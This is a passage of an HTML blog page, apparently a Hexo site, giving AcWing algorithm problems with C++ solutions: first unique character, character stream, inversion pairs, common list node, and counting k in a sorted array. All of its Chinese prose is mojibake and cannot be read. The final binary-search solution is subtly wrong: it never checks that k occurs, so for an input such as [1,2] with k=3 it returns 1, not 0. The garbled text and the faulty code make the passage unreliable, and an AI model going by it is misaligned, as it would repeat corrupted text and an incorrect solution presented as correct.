1], æ­¤æ—¶nå·²ä¸º0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦"><a href="https://www.acwing.com/problem/content/59/">å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦</a></h2><p>åœ¨å­—ç¬¦ä¸²ä¸­æ‰¾å‡ºç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ã€‚</p><p>å¦‚è¾“å…¥<code>&quot;abaccdeff&quot;</code>ï¼Œåˆ™è¾“å‡º<code>b</code>ã€‚</p><p>å¦‚æœå­—ç¬¦ä¸²ä¸­ä¸å­˜åœ¨åªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ï¼Œè¿”å› <code>#</code> å­—ç¬¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹ï¼š</strong></p><pre><code>è¾“å…¥ï¼š&quot;abaccdeff&quot;è¾“å‡ºï¼š'b'</code></pre><h3 id="hashè¡¨ç»Ÿè®¡">hashè¡¨ç»Ÿè®¡</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">char</span> <span class="title">firstNotRepeatingChar</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: s) hash[x]++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: s) &#123;</span><br><span class="line">      <span class="keyword">if</span> (hash[x] == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦"><a href="https://www.acwing.com/problem/content/60/">å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦</a></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥æ‰¾å‡ºå­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ã€‚</p><p>ä¾‹å¦‚ï¼Œå½“ä»å­—ç¬¦æµä¸­åªè¯»å‡ºå‰ä¸¤ä¸ªå­—ç¬¦ <code>go</code> æ—¶ï¼Œç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦æ˜¯ <code>g</code>ã€‚</p><p>å½“ä»è¯¥å­—ç¬¦æµä¸­è¯»å‡ºå‰å…­ä¸ªå­—ç¬¦ <code>google</code> æ—¶ï¼Œç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦æ˜¯ <code>l</code>ã€‚</p><p>å¦‚æœå½“å‰å­—ç¬¦æµæ²¡æœ‰å­˜åœ¨å‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ï¼Œè¿”å› <code>#</code> å­—ç¬¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>å­—ç¬¦æµè¯»å…¥å­—ç¬¦æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š&quot;google&quot;è¾“å‡ºï¼š&quot;ggg#ll&quot;è§£é‡Šï¼šæ¯å½“å­—ç¬¦æµè¯»å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå°±è¿›è¡Œä¸€æ¬¡åˆ¤æ–­å¹¶è¾“å‡ºå½“å‰çš„ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ã€‚</code></pre><h3 id="åŒæŒ‡é’ˆ-é˜Ÿåˆ—-hashè¡¨ç»Ÿè®¡">åŒæŒ‡é’ˆ(é˜Ÿåˆ—) + hashè¡¨ç»Ÿè®¡</h3><p>æ—¶é—´å¤æ‚åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">  queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// void insert(char ch)&#123;</span></span><br><span class="line">  <span class="comment">//   q.push(ch);</span></span><br><span class="line">  <span class="comment">//   hash[ch]++;</span></span><br><span class="line">  <span class="comment">//   // åªæ˜¯ç®€å•çš„pop, æ²¡æœ‰hashå¯¹åº”æ•°é‡çš„å˜åŒ–</span></span><br><span class="line">  <span class="comment">//   while (q.size() &amp;&amp; hash[q.front()] &gt; 1) q.pop();</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//Insert one char from stringstream</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> ch)</span></span>&#123;</span><br><span class="line">    <span class="comment">// ä¼˜åŒ–: åªæœ‰insertå¯¼è‡´é‡å¤å‡ºç°æ‰éœ€è¦popé˜Ÿå¤´; åªæœ‰å‡ºç°é‡å¤æ‰æœ‰å¿…è¦push(å¦åˆ™ä¸€å®šä¼šè¢«pop)</span></span><br><span class="line">    <span class="keyword">if</span> (++hash[ch] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; hash[q.<span class="built_in">front</span>()] &gt; <span class="number">1</span>) q.<span class="built_in">pop</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      q.<span class="built_in">push</span>(ch);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//return the first appearence once char in current stringstream</span></span><br><span class="line">  <span class="function"><span class="type">char</span> <span class="title">firstAppearingOnce</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> q.<span class="built_in">front</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„ä¸­çš„é€†åºå¯¹â˜…"><a href="https://www.acwing.com/problem/content/61/">æ•°ç»„ä¸­çš„é€†åºå¯¹â˜…</a></h2><p>åœ¨æ•°ç»„ä¸­çš„ä¸¤ä¸ªæ•°å­—å¦‚æœå‰é¢ä¸€ä¸ªæ•°å­—å¤§äºåé¢çš„æ•°å­—ï¼Œåˆ™è¿™ä¸¤ä¸ªæ•°å­—ç»„æˆä¸€ä¸ªé€†åºå¯¹ã€‚</p><p>è¾“å…¥ä¸€ä¸ªæ•°ç»„ï¼Œæ±‚å‡ºè¿™ä¸ªæ•°ç»„ä¸­çš„é€†åºå¯¹çš„æ€»æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>ç»™å®šæ•°ç»„çš„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,2,3,4,5,6,0]è¾“å‡ºï¼š6</code></pre><h3 id="åŸºäºå½’å¹¶æ’åºçš„ç»Ÿè®¡">åŸºäºå½’å¹¶æ’åºçš„ç»Ÿè®¡</h3><p>é€šè¿‡å½’å¹¶æ’åº, æ—¶é—´å¤æ‚åº¦ç”±æš´åŠ›åšæ³•çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> å‡å°åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>â‹…</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n \cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums_;</span><br><span class="line">  <span class="type">int</span> tmp[<span class="number">110</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">merge</span>(l, mid) + <span class="built_in">merge</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i = l, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums_[i] &lt;= nums_[j]) &#123;  <span class="comment">// é€†åºå¯¹è¿™å¿…é¡» &lt;=</span></span><br><span class="line">        tmp[k++] = nums_[i++];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tmp[k++] = nums_[j++];</span><br><span class="line">        res += mid - i + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid) tmp[k++] = nums_[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r) tmp[k++] = nums_[j++];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = l, j = <span class="number">0</span>; i &lt;= r; i++, j++) nums_[i] = tmp[j];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">inversePairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    nums_ = nums;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">merge</span>(<span class="number">0</span>, nums_.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹"><a href="https://www.acwing.com/problem/content/62/">ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹</a></h2><p>è¾“å…¥ä¸¤ä¸ªé“¾è¡¨ï¼Œæ‰¾å‡ºå®ƒä»¬çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹ã€‚</p><p>å½“ä¸å­˜åœ¨å…¬å…±èŠ‚ç‚¹æ—¶ï¼Œè¿”å›ç©ºèŠ‚ç‚¹ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,2000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2000</span><span class="mclose">]</span></span></span></span>ã€‚<br>ä¿è¯ä¸¤ä¸ªé“¾è¡¨ä¸å®Œå…¨ç›¸åŒï¼Œå³ä¸¤é“¾è¡¨çš„å¤´ç»“ç‚¹ä¸ç›¸åŒã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>ç»™å‡ºä¸¤ä¸ªé“¾è¡¨å¦‚ä¸‹æ‰€ç¤ºï¼šAï¼š        a1 â†’ a2                   â†˜                     c1 â†’ c2 â†’ c3                   â†—            B:     b1 â†’ b2 â†’ b3è¾“å‡ºç¬¬ä¸€ä¸ªå…¬å…±èŠ‚ç‚¹c1</code></pre><h3 id="é¢˜è§£-9">é¢˜è§£</h3><p>æœ‰2ç§æƒ…å†µ:</p><ol><li><p>å­˜åœ¨å…¬å…±èŠ‚ç‚¹, è®¾a1åˆ°å…¬å…±èŠ‚ç‚¹è·ç¦»ä¸ºa, b1åˆ°å…¬å…±èŠ‚ç‚¹è·ç¦»ä¸ºb, å…¬å…±æ®µé•¿åº¦ä¸ºc<br>é‚£ä¹ˆè®©ä¸¤æŒ‡é’ˆåˆ†åˆ«ä»a1, b1å‡ºå‘, åˆ°è¾¾åˆ—è¡¨ç»“å°¾å¤„ååˆ†åˆ«ä»b1å’Œa1é‡æ–°å‡ºå‘<br>åˆ™å®ƒä»¬ä¸€å®šä¼šåœ¨å…¬å…±èŠ‚ç‚¹å¤„ç›¸é€¢(èµ°çš„è·¯ç¨‹ a + c + b = b + c + a)</p></li><li><p>ä¸å­˜åœ¨å…¬å…±èŠ‚ç‚¹, è®¾a1å’Œb1åˆ°å„è‡ªé“¾è¡¨ç»“å°¾çš„è·ç¦»åˆ†åˆ«ä¸ºaå’Œb<br>åˆ™ä½¿ç”¨1ä¸­æ–¹æ³•, å®ƒä»¬ä¸€å®šä¹Ÿä¼šåŒæ—¶åˆ°è¾¾ç»“å°¾(èµ°çš„è·¯ç¨‹ä¸º a + b = b + a)</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode *<span class="title">findFirstCommonNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> p = headA, q = headB;</span><br><span class="line">    <span class="keyword">while</span> (p != q) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        p = headB;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        q = headA;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°"><a href="https://www.acwing.com/problem/content/63/">æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°</a></h2><p>ç»Ÿè®¡ä¸€ä¸ªæ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚</p><p>ä¾‹å¦‚è¾“å…¥æ’åºæ•°ç»„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1, 2, 3, 3, 3, 3, 4, 5]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">]</span></span></span></span> å’Œæ•°å­— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>ï¼Œç”±äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> åœ¨è¿™ä¸ªæ•°ç»„ä¸­å‡ºç°äº† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> æ¬¡ï¼Œå› æ­¤è¾“å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1, 2, 3, 3, 3, 3, 4, 5] ,  3è¾“å‡ºï¼š4</code></pre><h3 id="é¢˜è§£-10">é¢˜è§£</h3><blockquote><p>ä½¿ç”¨äºŒåˆ†æ³•æ‰¾åˆ°è¿ç»­åŒºé—´çš„ä¸Šè¾¹ç•Œå’Œä¸‹è¾¹ç•Œï¼Œè¿™æ ·æ‰èƒ½ä¿è¯æ—¶é—´å¤æ‚åº¦ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>åœ¨å·¥ç¨‹ä¸­å¯ä»¥ä½¿ç”¨<code>int num = count(nums.begin(), nums.end(), k);</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getNumberOfK</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums , <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &gt;= k) &#123;</span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> begin = l;</span><br><span class="line">    </span><br><span class="line">    l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &lt;= k) &#123;</span><br><span class="line">        l = mid;  <span class="comment">// å†™åˆ°è¿™é©¬ä¸Šç»™midåŠ 1</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        r = mid - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> l - begin + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 